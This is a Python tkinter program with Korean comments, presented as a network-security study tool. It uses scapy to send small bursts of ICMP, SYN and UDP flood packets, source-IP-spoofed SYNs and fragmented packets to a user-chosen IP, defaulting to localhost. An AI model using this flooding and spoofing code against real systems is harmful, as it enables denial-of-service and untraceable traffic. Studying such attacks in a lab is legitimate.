import tkinter as tk                 # 화면(윈도우창)을 만들기 위한 도구
from tkinter import scrolledtext    # 글자가 올라가는 로그창을 만들기 위한 도구
import threading                     # 프로그램이 멈추지 않게 '따로' 일을 시키는 도구
import random                        # 랜덤 숫자를 만들기 위한 도구
import time                          # 시간을 재거나 멈추게 하는 도구
from scapy.all import * # 네트워크 패킷(편지)을 만들고 보내는 핵심 도구

class NetworkStudyTool:
    def __init__(self, root):
        """ 프로그램이 처음 실행될 때 화면을 꾸미는 부분입니다 """
        self.root = root
        self.root.title("네트워크 보안 원리 공부방") # 창 이름
        self.root.geometry("600x550")               # 창 크기

        # 상단 안내 문구
        self.label = tk.Label(root, text="[ 주의: 내 컴퓨터나 가상 환경에서만 연습하세요! ]", fg="red")
        self.label.pack(pady=10)

        # IP 주소를 입력받는 칸 만들기
        self.ip_frame = tk.Frame(root)
        self.ip_frame.pack(pady=5)
        tk.Label(self.ip_frame, text="타겟 IP 주소: ").pack(side=tk.LEFT)
        self.target_ip = tk.Entry(self.ip_frame)
        self.target_ip.insert(0, "127.0.0.1") # 기본값으로 내 컴퓨터(로컬) 주소 입력
        self.target_ip.pack(side=tk.LEFT)

        # 프로그램이 무슨 일을 하는지 보여주는 검은색 로그창
        self.log_area = scrolledtext.ScrolledText(root, width=70, height=15, bg="black", fg="white")
        self.log_area.pack(pady=10)

        # 공격 버튼들을 모아놓을 공간
        self.btn_frame = tk.Frame(root)
        self.btn_frame.pack(pady=10)

        # 각 버튼에 이름을 붙이고 클릭하면 실행될 기능을 연결
        self.create_button("ICMP 홍수", self.icmp_flood)
        self.create_button("SYN 홍수", self.syn_flood)
        self.create_button("IP 속이기", self.ip_spoofing)
        self.create_button("패킷 쪼개기", self.frag_attack)
        self.create_button("UDP 던지기", self.udp_flood)

    def create_button(self, text, command):
        """ 버튼을 편하게 만들기 위한 보조 함수 """
        btn = tk.Button(self.btn_frame, text=text, command=lambda: self.run_in_thread(command), width=12)
        btn.pack(side=tk.LEFT, padx=5)

    def log(self, message):
        """ 로그창에 한 줄씩 기록을 남기는 함수 """
        self.log_area.insert(tk.END, f"[{time.strftime('%H:%M:%S')}] {message}\n")
        self.log_area.see(tk.END) # 새 글이 올라오면 화면을 자동으로 아래로 내림

    def run_in_thread(self, func):
        """ 패킷을 보내는 동안 프로그램이 '응답 없음'이 되지 않게 별도로 실행함 """
        thread = threading.Thread(target=func)
        thread.daemon = True # 프로그램 종료 시 같이 종료됨
        thread.start()

    # --- 여기서부터는 각 공격의 원리를 코드로 만든 부분입니다 ---

    def icmp_flood(self):
        # [원리] "야, 너 거기 있어?"(Ping)라고 수천 번 물어봐서 상대를 지치게 함
        dst = self.target_ip.get()
        self.log(f"ICMP 홍수 시작! -> {dst}")
        packet = IP(dst=dst)/ICMP() # 목적지 주소를 적은 ICMP 봉투를 만듦
        for i in range(20):
            send(packet, verbose=False) # 편지 전송
            self.log(f"{i+1}번째 안부 인사(Ping) 보내는 중...")
        self.log("학습용 전송 완료.")

    def syn_flood(self):
        # [원리] "우리 대화할까?"(SYN)라고 말만 하고, 상대가 "그래!" 하면 입을 꾹 닫음.
        # 이런 요청이 쌓이면 상대방은 대화 대기방이 꽉 차서 다른 손님을 못 받음.

        dst = self.target_ip.get()
        self.log(f"SYN 홍수 시작! -> {dst}:80포트")
        packet = IP(dst=dst)/TCP(dport=80, flags="S") # S는 SYN(연결요청) 신호
        for i in range(20):
            send(packet, verbose=False)
            self.log(f"{i+1}번째 연결 요청 중...")
        self.log("학습용 전송 완료.")

    def ip_spoofing(self):
        # [원리] 편지를 보낼 때 내 주소를 가짜 주소로 적어서 보냄.
        # 상대방은 누가 공격하는지 찾기 힘들어짐.
        dst = self.target_ip.get()
        self.log(f"IP 속이기 시작! -> {dst}")
        for i in range(10):
            # 1~254 사이의 숫자 4개를 조합해 가짜 IP(예: 1.2.3.4) 생성
            fake_ip = ".".join(map(str, (random.randint(1, 254) for _ in range(4))))
            packet = IP(src=fake_ip, dst=dst)/TCP(dport=80, flags="S")
            send(packet, verbose=False)
            self.log(f"가짜 주소 [{fake_ip}]로 위장해서 보냄")
        self.log("학습용 전송 완료.")

    def frag_attack(self):
        # [원리] 아주 큰 데이터를 잘게 쪼개서 보냄.
        # 받는 사람은 이 조각들을 다시 합치느라 CPU와 메모리를 많이 쓰게 됨.

        dst = self.target_ip.get()
        self.log(f"패킷 쪼개기(단편화) 시작! -> {dst}")
        big_data = Raw(load="A" * 3000) # 'A'가 3000개 들어있는 아주 큰 데이터
        packet = IP(dst=dst)/ICMP()/big_data

        # fragment 함수가 알아서 패킷을 작은 조각(500바이트씩)으로 나눔
        fragments = fragment(packet, fragsize=500)
        for f in fragments:
            send(f, verbose=False)
            self.log("패킷의 작은 조각 전송 중...")
        self.log("학습용 전송 완료.")

    def udp_flood(self):
        # [원리] 대답이 필요 없는 UDP 편지를 마구 던짐.
        # 도로에 차가 너무 많아서 진짜 중요한 차들이 못 지나가게 만드는 것과 같음.
        dst = self.target_ip.get()
        self.log(f"UDP 던지기 시작! -> {dst}")
        for i in range(20):
            # 아무 포트(1~65535)로나 무작위로 보냄
            random_port = random.randint(1, 65535)
            packet = IP(dst=dst)/UDP(dport=random_port)/Raw(load="쓰레기 데이터")
            send(packet, verbose=False)
            self.log(f"{i+1}번째 UDP 패킷을 {random_port}번 포트로 던짐")
        self.log("학습용 전송 완료.")

# --- 프로그램 실행 ---
if __name__ == "__main__":
    root = tk.Tk()
    app = NetworkStudyTool(root)
    root.mainloop()